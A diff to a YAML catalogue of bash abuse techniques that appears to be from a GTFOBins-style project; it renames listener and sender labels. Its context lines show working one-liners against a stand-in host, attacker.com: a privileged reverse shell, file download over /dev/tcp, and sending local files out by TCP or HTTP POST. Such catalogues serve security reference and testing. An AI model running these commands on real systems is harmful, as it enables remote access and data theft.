@@ -14,7 +14,7 @@ functions:
               3<>/dev/tcp/attacker.com/12345 \
               | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > /path/to/output-file'
       unprivileged:
-    sender: HTTP
+    sender: http-server
   - binary: false
     code: |-
       bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
@@ -24,7 +24,7 @@ functions:
         code: |-
           bash -p -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
       unprivileged:
-    sender: TCP
+    sender: tcp-server
   file-read:
   - binary: false
     code: |-
@@ -86,7 +86,7 @@ functions:
         code: |-
           bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
       unprivileged:
-    listener: TCP
+    listener: tcp
   shell:
   - code: |-
       bash
@@ -106,7 +106,7 @@ functions:
         code: |-
           bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
       unprivileged:
-    receiver: HTTP
+    receiver: http-server
   - binary: false
     code: |-
       bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
@@ -116,5 +116,5 @@ functions:
         code: |-
           bash -p -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
       unprivileged:
-    receiver: TCP
+    receiver: tcp-server
 ...
